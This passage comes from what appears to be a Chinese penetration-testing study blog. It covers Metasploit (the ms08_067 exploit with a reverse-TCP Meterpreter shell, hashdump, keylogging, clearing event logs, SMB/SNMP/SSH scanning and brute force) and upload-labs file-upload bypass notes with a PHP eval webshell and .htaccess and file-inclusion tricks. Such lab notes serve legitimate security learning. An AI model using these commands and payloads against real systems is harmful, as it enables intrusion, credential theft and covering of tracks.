上传和预加载 dll 进行扩展模块 TLS/1.0 通信隧道</li><li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li></ul></li><li>服务端使用 c 语言编写</li><li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li></ul><h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><pre><code>root@kali:~# cat metepreter.rb use exploit/windows/smb/ms08_067_netapiset payload windows/meterpreter/reverse_tcpset RHOST 10.10.10.147set LHOST 10.10.10.131run</code></pre><p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p><ul><li>帮助文件</li></ul><pre><code>meterpreter &gt; help核心命令=============    命令                     描述    -------                   -----------    ?                         帮助菜单    background                背景当前会话    bgkill                    杀死一个背景meterpreter脚本    bglist                    列出运行后台脚本    bgrun                     执行一个meterpreter脚本作为后台线程    channel                   显示信息或控制活动频道    close                     关闭频道    disable_unicode_encoding  禁用unicode字符串的编码    enable_unicode_encoding   启用unicode字符串的编码    exit                      终止meterpreter会话    get_timeouts              获取当前会话超时值    guid                      获取会话GUID    help                      帮助菜单    info                      显示有关Post模块的信息    irb                       进入irb脚本模式    load                      加载一个或多个meterpreter扩展    machine_id                获取连接到会话的计算机的MSF ID    migrate                   将服务器迁移到另一个进程    pivot                     管理数据透视监听器    quit                      终止meterpreter会话    read                      从频道读取数据    resource                  运行存储在文件中的命令    run                       执行meterpreter脚本或Post模块    sessions                  快速切换到另一个会话    set_timeouts              设置当前会话超时值    sleep                     Force Meterpreter安静，然后重新建立会话。    transport                 更改当前的传输机制    use                       不推荐使用“加载”别名    uuid                      获取当前会话的UUID    write                     将数据写入通道Stdapi: 文件系统命令============================    命令          描述    -------       -----------    cat           将文件的内容读取到屏幕上    cd            更改目录    checksum      检索文件的校验和    cp            将源复制到目标    dir           列表文件（ls的别名）    download      下载文件或目录    edit          编辑一个文件    getlwd        打印本地工作目录    getwd         打印工作目录    lcd           更改本地工作目录    lls           列出本地文件    lpwd          打印本地工作目录    ls            列出文件    mkdir         建立目录    mv            将源移到目标    pwd           打印工作目录    rm            删除指定的文件    rmdir         删除目录    search        搜索文件    show_mount    列出所有安装点/逻辑驱动器    upload        上传文件或目录Stdapi: 网络命令===========================    命令          描述    -------       -----------    arp           显示主机ARP缓存    getproxy      显示当前的代理配置    ifconfig      显示界面    ipconfig      显示界面    netstat       显示网络连接    portfwd       将本地端口转发到远程服务    resolve       解析目标上的一组主机名    route         查看和修改路由表Stdapi: 系统命令=======================    Command       Description    -------       -----------    clearev       清除事件日志    drop_token    放弃任何活动的模拟令牌。    execute       执行一个命令    getenv        获取一个或多个环境变量值    getpid        获取当前的进程标识符    getprivs      尝试启用当前进程可用的所有权限    getsid        获取运行服务器的用户的SID    getuid        获取服务器正在运行的用户    kill          终止一个过程    localtime     显示目标系统的本地日期和时间    pgrep         按名称过滤进程    pkill         按名称终止进程    ps            列出运行的进程    reboot        重新启动远程计算机    reg           修改远程注册表并与之交互    rev2self      在远程机器上调用RevertToSelf（）    shell         放入系统命令外壳    shutdown      关闭远程计算机    steal_token   尝试从目标进程中盗取模拟令牌    suspend       暂停或恢复进程列表    sysinfo       获取有关远程系统的信息，例如OSStdapi: 用户界面命令===============================    命令          描述    -------        -----------    enumdesktops   列出所有可访问的桌面和窗口工作站    getdesktop     获取当前meterpreter桌面    idletime       返回远程用户闲置的秒数    keyscan_dump   转储按键缓冲区    keyscan_start  开始捕捉击键    keyscan_stop   停止捕获击键    screenshot     获取交互式桌面的屏幕截图    setdesktop     更改meterpreters当前桌面    uictl          控制一些用户界面组件Stdapi: Webcam 命令=======================    命令          描述    -------        -----------    record_mic     从默认麦克风录制音频X秒    webcam_chat    开始视频聊天    webcam_list    列出网络摄像头    webcam_snap    从指定的摄像头拍摄快照    webcam_stream  从指定的摄像头播放视频流Priv: Elevate Commands======================    命令          描述    -------       -----------    getsystem     尝试将您的特权提升为本地系统的特权。Priv: 密码数据库命令================================    命令          描述    -------       -----------    hashdump      转储SAM数据库的内容Priv: Timestomp 命令========================    命令          描述    -------       -----------    timestomp     操纵文件MACE属性</code></pre><ul><li>使用</li></ul><pre><code>meterpreter &gt; execute -f cmd.exemeterpreter &gt; psmeterpreter &gt; getuidmeterpreter &gt; getpidmeterpreter &gt; clearev   # 清除日志meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -lmsf exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1meterpreter &gt; hashdump  # 读取密码meterpreter &gt; run post/windows/gather/hashdump  # 读取密码meterpreter &gt; shell</code></pre><p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p><h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul><li>2015 年11月份，来自社区贡献</li><li>无需运行环境，在客户端运行原生 python 代码</li><li>使用</li></ul><pre><code>meterpreter &gt; load pythonmeterpreter &gt; python_execute &quot;print (&#39;asdasdas&#39;)&quot;meterpreter &gt; python_execute &quot;import os; cd = os.getcwd()&quot; -r cdroot@kali:~# cat find2.py import osfor root,dirs,files in os.walk(c://*):    for file in files:        if file.endwith(&quot;.ini&quot; ) and file.startwith(&quot;win&quot;):            print(os.path.john(root,file))python_import -f find.py</code></pre><h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul><li>2015 年6月已经被取消</li><li>由 msfconsole -x 取代</li><li>编写脚本时便于引用</li></ul><pre><code>msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 10.10.10.147; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.131; set LPORT 5555; set target 34; exploit&quot;</code></pre><h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul><li>信息收集的模块都在 auxiliary/scanner/ 之下</li></ul><pre><code>msf &gt; use auxiliary/scanner/ [TAB]Display all 531 possibilities? (y or n)</code></pre><h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul><li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li></ul><pre><code>msf &gt; db_nmap -sV 10.10.10.0/24</code></pre><ul><li>auxiliary 目录下</li><li>RHOSTS &lt;&gt; RHOST<ul><li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li><li>也可以编写地址列表：file:/root/h.txt</li></ul></li></ul><h4 id="2-主机发现扫描"><a href="#2-主机发现扫描" class="headerlink" title="2.主机发现扫描"></a>2.主机发现扫描</h4><ul><li>use auxiliary/scanner/discovery/arp_sweep</li><li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li></ul><pre><code>msf &gt; search arpmsf &gt; use auxiliary/scanner/discovery/arp_sweepmsf auxiliary(scanner/discovery/arp_sweep) &gt; show options msf auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 10.10.10.0/24msf auxiliary(scanner/discovery/arp_sweep) &gt; set INTERFACE eth0msf auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 20msf auxiliary(scanner/discovery/arp_sweep) &gt; run</code></pre><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul><li>use auxiliary/scanner/portscan/syn</li><li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li></ul><pre><code>msf &gt; search portscanmsf &gt; use auxiliary/scanner/portscan/synmsf auxiliary(scanner/portscan/syn) &gt; show options msf auxiliary(scanner/portscan/syn) &gt; set INTERFACE eth0msf auxiliary(scanner/portscan/syn) &gt; set PORTS 80msf auxiliary(scanner/portscan/syn) &gt; set RHOSTS 10.10.10.0/24msf auxiliary(scanner/portscan/syn) &gt; set THREADS 50msf auxiliary(scanner/portscan/syn) &gt; run</code></pre><h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul><li>查找 ipidseq 主机（查找僵尸机）<ul><li>use auxiliary/scanner/ip/ipidseq</li><li>set RHOSTS 192.168.1.0/24 ；run</li><li>nmap -PN -sI 10.10.10.147 10.10.10.132</li></ul></li></ul><pre><code>msf &gt; use auxiliary/scanner/ip/ipidseqmsf auxiliary(scanner/ip/ipidseq) &gt; show options msf auxiliary(scanner/ip/ipidseq) &gt; set RHOSTS 10.10.10.100-150msf auxiliary(scanner/ip/ipidseq) &gt; set THREADS 20msf auxiliary(scanner/ip/ipidseq) &gt; run</code></pre><pre><code>msf &gt; db_nmap -PN -sI 10.10.10.147 10.10.10.132</code></pre><h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul><li>use auxiliary/scanner/discovery/udp_sweep</li><li>use auxiliary/scanner/discovery/udp_probe</li></ul><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_sweepmsf auxiliary(scanner/discovery/udp_sweep) &gt; show options msf auxiliary(scanner/discovery/udp_sweep) &gt; set RHOSTS 10.10.10.100-150msf auxiliary(scanner/discovery/udp_sweep) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probemsf auxiliary(scanner/discovery/udp_probe) &gt; show options msf auxiliary(scanner/discovery/udp_probe) &gt; set RHOSTS 10.10.10.100-150msf auxiliary(scanner/discovery/udp_probe) &gt; set CHOST 10.10.10.131msf auxiliary(scanner/discovery/udp_probe) &gt; set THREADS 20msf auxiliary(scanner/discovery/udp_probe) &gt; run</code></pre><h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul><li>use auxiliary/sniffer/psnuffle</li><li>支持从 pacap 抓包文件中提取密码</li><li>功能类似于 dsniff</li><li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li></ul><pre><code>msf &gt; search sniffermsf &gt; use auxiliary/sniffer/psnufflemsf auxiliary(sniffer/psnuffle) &gt; show options msf auxiliary(sniffer/psnuffle) &gt; set INTERFACE eth0msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><pre><code>root@kali:~# ftp 10.10.10.148</code></pre><pre><code># 继续上述msf auxiliary(sniffer/psnuffle) &gt; show optionsmsf auxiliary(sniffer/psnuffle) &gt; set PCAPFILE /root/ftp.pcapngmsf auxiliary(sniffer/psnuffle) &gt; jobsmsf auxiliary(sniffer/psnuffle) &gt; kill 0msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul><li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li><li>use auxiliary/scanner/snmp/snmp_login</li><li>use auxiliary/scanner/snmp/snmp_enum</li><li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li><li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li></ul><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_loginmsf auxiliary(scanner/snmp/snmp_login) &gt; show options msf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 10.10.10.149msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 20msf auxiliary(scanner/snmp/snmp_login) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enummsf auxiliary(scanner/snmp/snmp_enum) &gt; show options msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.149msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enummsf auxiliary(scanner/snmp/snmp_enum) &gt; show options msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.142 （windows）msf auxiliary(scanner/snmp/snmp_enum) &gt; runmsf auxiliary(scanner/snmp/snmp_enum) &gt; set COMMUNITY jlcssadmin （SNMP 服务器团体名）msf auxiliary(scanner/snmp/snmp_enum) &gt; set THREADS 20msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumusersmsf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set COMMUNITY jlcssadminmsf auxiliary(scanner/snmp/snmp_enumusers) &gt; set RHOSTS 10.10.10.142msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumsharesmsf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set COMMUNITY jlcssadminmsf auxiliary(scanner/snmp/snmp_enumshares) &gt; set RHOSTS 10.10.10.142msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</code></pre><h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul><li>SMB 版本扫描<ul><li>use auxiliary/scanner/smb/smb_version</li></ul></li><li>扫描命令管道。判断 SMB 服务类型（账号、密码）<ul><li>use auxiliary/scanner/smb/pipe_auditor</li></ul></li><li>扫描通过 SMB 管道可以访问的 RCERPC 服务<ul><li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li></ul></li><li>SMB 共享账号（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_enumshares</li></ul></li><li>SMB 用户枚举（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_enumusers</li></ul></li><li>SID 枚举（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_lookupsid</li></ul></li><li>SMB 版本扫描</li></ul><pre><code>msf &gt; search smbmsf &gt; use auxiliary/scanner/smb/smb_versionmsf auxiliary(scanner/smb/smb_version) &gt; show options msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_version) &gt; set SMBUSER Administratormsf auxiliary(scanner/smb/smb_version) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><ul><li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/pipe_auditormsf auxiliary(scanner/smb/pipe_auditor) &gt; show options msf auxiliary(scanner/smb/pipe_auditor) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/pipe_auditor) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBPass 123456</code></pre><ul><li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditormsf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show options msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBPass 123456msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><ul><li>SMB 共享账号（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumsharesmsf auxiliary(scanner/smb/smb_enumshares) &gt; show options msf auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><ul><li>SMB 用户枚举（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumusersmsf auxiliary(scanner/smb/smb_enumusers) &gt; show options msf auxiliary(scanner/smb/smb_enumusers) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><ul><li>SID 枚举（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/smb_lookupsidmsf auxiliary(scanner/smb/smb_lookupsid) &gt; show options msf auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.148</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_lookupsid) &gt; run</code></pre><h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul><li>SSH 版本扫描<ul><li>use auxiliary/scanner/ssh/ssh_version</li></ul></li><li>SSH 密码爆破<ul><li>use auxiliary/scanner/ssh/ssh_login<ul><li>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</li></ul></li></ul></li><li>SSH 公钥登陆<ul><li>use auxiliary/scanner/ssh/ssh_login_pubkey<ul><li>set KEY_FILE id_rsa；set USERNAME root ；run</li></ul></li></ul></li><li>SSH 版本扫描</li></ul><pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_versionmsf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ssh/ssh_version) &gt; run</code></pre><ul><li>SSH 密码爆破</li></ul><pre><code>root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt msf &gt; use auxiliary/scanner/ssh/ssh_loginmsf auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txtmsf auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE false msf auxiliary(scanner/ssh/ssh_login) &gt; run</code></pre><ul><li>SSH 公钥登陆</li></ul><pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkeymsf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set USERNAME rootmsf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</code></pre><h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul><li><p>基于已经取得的 session 进行检测</p></li><li><p>use post/windows/gather/enum_patches</p><ul><li>show advanced</li><li>set VERBOSE yes</li></ul></li><li><p>检查失败</p><ul><li>known bug in WMI query, try migrating to another process</li><li>迁移到另一个进程再次进行尝试</li></ul></li><li><p>ms08-067</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>“文件上传漏洞学习</title>
      <link href="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/"/>
      <url>/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传-文件包含漏洞学习笔记-靶场实战"><a href="#文件上传-文件包含漏洞学习笔记-靶场实战" class="headerlink" title="文件上传+文件包含漏洞学习笔记+靶场实战"></a>文件上传+文件包含漏洞学习笔记+靶场实战</h1><p>[TOC]</p><h2 id="文件上传漏洞部分"><a href="#文件上传漏洞部分" class="headerlink" title="文件上传漏洞部分"></a>文件上传漏洞部分</h2><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p><strong>一.什么是文件上传漏洞</strong></p><p> 文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p><p><strong>二.文件上传漏洞危害</strong></p><ul><li>网站被控制，对文件增删改查，执行命令，链接数据库</li><li>如果服务器长久未更新，可以利用exp提权，导致服务器沦陷</li><li>同服务器的其他网站沦陷。</li></ul><p><strong>二.文件上传漏洞的主要利用和绕过方式总结。</strong></p><p><strong>1.前端JS绕过</strong></p><p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p><p><strong>2.MIME 类型验证</strong></p><p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p><p><strong>3.黑名单验证</strong></p><p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p><p>2.大小写绕过：例如Php</p><p><strong>4.文件内容验证</strong></p><p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p><p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p><p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p><p><strong>6. .htaccess上传</strong></p><p>上传的.jpg文件都会以php格式解析</p><p>.htaccess内容</p><pre><code>AddType   application/x-httpd-php     .jpg</code></pre><p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p><p><strong>7.00截断绕过</strong></p><p>php.   jpg  将空格二进制20改为00；</p><p><strong>8.win系统解析漏洞绕过</strong></p><p>1.上传1.php(或者图片马)，抓包修改为1.php.</p><p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p><p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p><p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p><p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p><pre class=" language-php"><code class="language-php"><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后我们访问1.php?x=shell.jpg即可。</p><p><strong>10.条件竞争绕过</strong></p><p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p><p><strong>11.二次渲染绕过</strong></p><p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p><p><strong>12.中间件解析漏洞</strong></p><p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p><p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p><p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p><p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p><p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p><p>​            upload/image/1.jpg/.php</p><p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p><h4 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h4><p><strong>upolad-labs考察知识点汇总：</strong></p><img src="11525934-e19630249b9b8764.png"  /><p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p><h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt=""></p><h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt=""></p><h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p><h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p><p>我们首先上传.htaccess文件，</p><img src="QQ截图20200124121848.png" style="zoom: 80%;" /><p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p><img src="QQ截图20200124122245.png" style="zoom:150%;" /><p>可以在本地看到成功上传。</p><h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p><img src="QQ截图20200124124135.png" style="zoom: 80%;" /><h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt=""></p><h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p><img src="QQ截图20200124130943.png" style="zoom:150%;" /><h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p><p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt=""></p><h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token 